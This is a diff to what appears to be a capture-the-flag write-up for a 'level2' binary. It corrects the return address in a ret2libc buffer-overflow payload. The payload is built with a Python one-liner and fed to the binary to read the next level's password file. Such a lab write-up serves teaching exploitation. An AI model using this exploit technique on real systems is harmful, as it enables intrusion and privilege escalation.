@@ -50,7 +50,7 @@ Next, we need to construct the payload to exploit the vulnerability using the fo
 buffer + return address + system function address + fake return address + "/bin/sh" address from libc
 ```
 ```
-$ (python -c "print 'A' * 80 + '\x44\x84\x04\x08' + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7'") > /tmp/payload2
+$ (python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7'") > /tmp/payload2
 $ cat /tmp/payload2 - | ./level2
 $ cat /home/user/level3/.pass
 
